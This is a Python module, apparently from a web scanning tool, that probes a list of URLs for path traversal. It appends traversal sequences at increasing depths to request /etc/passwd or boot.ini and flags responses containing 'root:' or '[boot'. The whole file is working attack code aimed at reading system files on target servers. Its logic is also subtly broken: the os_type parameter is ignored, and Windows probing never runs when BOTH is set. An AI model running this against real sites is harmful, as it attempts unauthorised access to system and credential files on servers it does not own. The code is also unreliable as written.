from utils.utilities import *

class OS_TYPE:
    LINUX=1
    WINDOWS=2
    BOTH=3

class PathTraversal(BaseClass):
    def __init__(self,reporter,depth=6,os_type=OS_TYPE.LINUX):
        super().__init__()
        CONFIGS.TIMEOUT=7
        
        self.depth=depth
        self.os=OS_TYPE.LINUX
        self.reporter=reporter
        
    def start(self,urls):
        
        results403=[]
        self.reporter.createBlock("PathTraversal")
        
        for url in urls:
            url=url.split("/")[:-1]
            url="/".join(url)+"/"
      
            for depth in range(self.depth):
                for key in CONFIGS.CONST_PATH_TRAVERSAL_PAYLOADS.keys():
                   payload=key*depth
          
                   if(self.os==OS_TYPE.LINUX or self.os==OS_TYPE.BOTH):
                       payload=payload+"etc"+CONFIGS.CONST_PATH_TRAVERSAL_PAYLOADS[key]+"passwd"
                       resp=self.requester.sendGET(url+payload)
                       
                       if(resp is None):
                           continue
                       
                       if(resp.status_code==403):
                           results403.append(url+payload)
                       if("root:" in resp.text):
                           self.reporter.addRow(url+payload,placeholder="FOUND! #200")
                   
                   elif(self.os==OS_TYPE.WINDOWS or self.os==OS_TYPE.BOTH):
                       payload=payload+"boot.ini"
                       resp=self.requester.sendGET(url+payload)
                       
                       
                       if(resp is None):
                           continue
                       
                       if(resp.status_code==403):
                           results403.append(url+payload)
                       if("[boot" in resp.text):
                           self.reporter.addRow(url+payload,placeholder="FOUND! #200")
                                          
        append_file(results403,CONFIGS.CONST_DIRSEARCH_OUT_403)
